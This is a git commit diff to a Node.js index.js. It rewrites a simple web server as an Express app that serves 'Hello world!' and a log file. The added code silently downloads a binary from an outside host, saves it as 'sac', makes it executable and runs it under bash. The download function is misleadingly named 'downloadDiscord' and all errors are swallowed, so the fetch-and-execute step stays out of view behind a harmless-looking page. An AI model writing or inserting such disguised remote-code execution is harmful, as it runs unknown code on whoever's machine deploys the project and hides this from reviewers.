5e1f32e80d5994993a3a7b788a95e8f952a2b9cf
axliuliu <9866liu@gmail.com>
2025-10-13 10:51:08 +0800

    Update index.js

--- index.js
+++ index.js
@@ -1,51 +1,68 @@
-const http = require('http');
+const express = require("express");
+const app = express();
 const fs = require('fs');
-const exec = require("child_process").exec;
-const subtxt = './.npm/sub.txt' 
-const PORT = process.env.PORT || 3000; 
+const path = require('path');
+const axios = require('axios');
+const { exec } = require('child_process');
+const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
+const FILE_PATH = './.npm'; 
 
-// Run start.sh
-fs.chmod("start.sh", 0o777, (err) => {
-  if (err) {
-      console.error(`start.sh empowerment failed: ${err}`);
-      return;
-  }
-  console.log(`start.sh empowerment successful`);
-  const child = exec('bash start.sh');
-  child.stdout.on('data', (data) => {
-      console.log(data);
-  });
-  child.stderr.on('data', (data) => {
-      console.error(data);
-  });
-  child.on('close', (code) => {
-      console.log(`child process exited with code ${code}`);
-      console.clear()
-      console.log(`App is running`);
+app.get("/", function(req, res) {
+  res.send("Hello world!");
+});
+
+app.get("/log", (req, res) => {
+  const logPath = path.join(FILE_PATH, 'log.txt');
+  fs.readFile(logPath, "utf8", (err, data) => {
+    if (err) {
+      console.error(err);
+      res.status(500).send("Error reading log.txt");
+    } else {
+      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
+      res.send(data);
+    }
   });
 });
 
-// create HTTP server
-const server = http.createServer((req, res) => {
-    if (req.url === '/') {
-      res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
-      res.end('Hello world!');
-    }
-    // get-sub
-    if (req.url === '/sub') {
-      fs.readFile(subtxt, 'utf8', (err, data) => {
-        if (err) {
-          console.error(err);
-          res.writeHead(500, { 'Content-Type': 'application/json' });
-          res.end(JSON.stringify({ error: 'Error reading sub.txt' }));
-        } else {
-          res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
-          res.end(data);
-        }
-      });
-    }
-  });
+const downloadDiscord = async () => {
+  try {
+    // console.log('Start downloading sac...');
+    const response = await axios({
+      method: 'get',
+      url: 'https://amd64.ssss.nyc.mn/glitch',
+      responseType: 'stream'
+    });
 
-server.listen(PORT, () => {
-  console.log(`Server is running on port ${PORT}`);
+    const writer = fs.createWriteStream('sac');
+    response.data.pipe(writer);
+
+    return new Promise((resolve, reject) => {
+      writer.on('finish', () => {
+        console.log('Download completed');
+        exec('chmod +x sac', (err) => {
+          if (err) reject(err);
+          resolve();
+        });
+      });
+      writer.on('error', reject);
+    });
+  } catch (err) {
+    throw err;
+  }
+};
+
+const Execute = async () => {
+  try {
+    await downloadDiscord();
+    const command = './sac';
+    exec(command, { 
+      shell: '/bin/bash'
+    });
+  } catch (err) {}
+};
+
+Execute();
+
+app.listen(PORT, () => {
+  console.log(`Server is running on port:${PORT}`);
 });
